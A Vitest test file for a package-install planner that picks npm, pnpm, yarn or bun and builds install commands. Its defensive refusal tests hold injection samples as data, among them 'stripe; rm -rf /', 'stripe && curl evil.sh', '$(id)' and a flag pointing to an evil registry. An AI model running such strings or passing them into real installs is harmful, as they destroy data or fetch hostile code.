import { describe, expect, it } from "vitest";
import { alreadyInstalled, detectRunner, planInstall } from "./vibePackages";

describe("runner detection", () => {
  it("believes the lockfile over the declared packageManager", () => {
    expect(detectRunner(["pnpm-lock.yaml", "package.json"], "npm@10.0.0")).toBe("pnpm");
    expect(detectRunner(["bun.lockb"], "yarn@4")).toBe("bun");
  });

  it("falls back to the declared field, then to npm", () => {
    expect(detectRunner(["package.json"], "yarn@4.1.0")).toBe("yarn");
    expect(detectRunner(["package.json"], null)).toBe("npm");
    expect(detectRunner([], "something-else")).toBe("npm");
  });
});

describe("install planning", () => {
  it("builds argv for each runner's own verb", () => {
    expect(planInstall([{ name: "stripe" }], "pnpm", "/app")).toMatchObject({
      ok: true,
      argv: ["pnpm", "add", "stripe"],
      cwd: "/app",
    });
    expect(planInstall([{ name: "stripe" }], "npm", "/app")).toMatchObject({
      argv: ["npm", "install", "stripe"],
    });
  });

  it("carries a version range and marks dev dependencies", () => {
    expect(planInstall([{ name: "vitest", version: "^3.1.0", dev: true }], "npm", "/app"))
      .toMatchObject({ argv: ["npm", "install", "vitest@^3.1.0", "--save-dev"] });
    expect(planInstall([{ name: "vitest", dev: true }], "yarn", "/app")).toMatchObject({
      argv: ["yarn", "add", "vitest", "--dev"],
    });
  });

  it("keeps scoped names intact", () => {
    expect(planInstall([{ name: "@stripe/stripe-js" }], "pnpm", "/app")).toMatchObject({
      argv: ["pnpm", "add", "@stripe/stripe-js"],
    });
  });

  it("says plainly what it is about to do", () => {
    const plan = planInstall([{ name: "a" }, { name: "b" }, { name: "c" }], "pnpm", "/app");
    expect(plan.ok && plan.summary).toBe("Installing a, b and c with pnpm.");
  });

  it("refuses shell metacharacters instead of sanitizing them", () => {
    for (const name of ["stripe; rm -rf /", "stripe && curl evil.sh", "st`whoami`ripe", "a|b"]) {
      const plan = planInstall([{ name }], "npm", "/app");
      expect(plan.ok, name).toBe(false);
      if (!plan.ok) expect(plan.refusal).toBe("illegal-name");
    }
  });

  it("refuses an argument that would arrive as a flag", () => {
    const plan = planInstall([{ name: "--registry=http://evil" }], "npm", "/app");
    expect(plan.ok).toBe(false);
    if (!plan.ok) expect(plan.refusal).toBe("looks-like-a-flag");
  });

  it("refuses a version range it does not recognize", () => {
    const plan = planInstall([{ name: "stripe", version: "$(id)" }], "npm", "/app");
    expect(plan.ok).toBe(false);
    if (!plan.ok) expect(plan.refusal).toBe("illegal-version");
  });

  it("refuses an empty request and an unattended flood", () => {
    expect(planInstall([], "npm", "/app")).toMatchObject({ refusal: "no-packages" });
    const many = Array.from({ length: 21 }, (_, i) => ({ name: `pkg-${i}` }));
    expect(planInstall(many, "npm", "/app")).toMatchObject({ refusal: "too-many-packages" });
  });

  it("will not mix runtime and dev dependencies into one lie of a command", () => {
    const plan = planInstall([{ name: "a" }, { name: "b", dev: true }], "npm", "/app");
    expect(plan.ok).toBe(false);
    if (!plan.ok) expect(plan.why).toMatch(/separate installs/);
  });
});

describe("already installed", () => {
  it("sees a package in either dependency map", () => {
    expect(alreadyInstalled({ name: "stripe" }, { stripe: "^5.0.0" })).toBe(true);
    expect(alreadyInstalled({ name: "vitest" }, {}, { vitest: "^3.0.0" })).toBe(true);
    expect(alreadyInstalled({ name: "stripe" }, { react: "^19.0.0" })).toBe(false);
  });
});
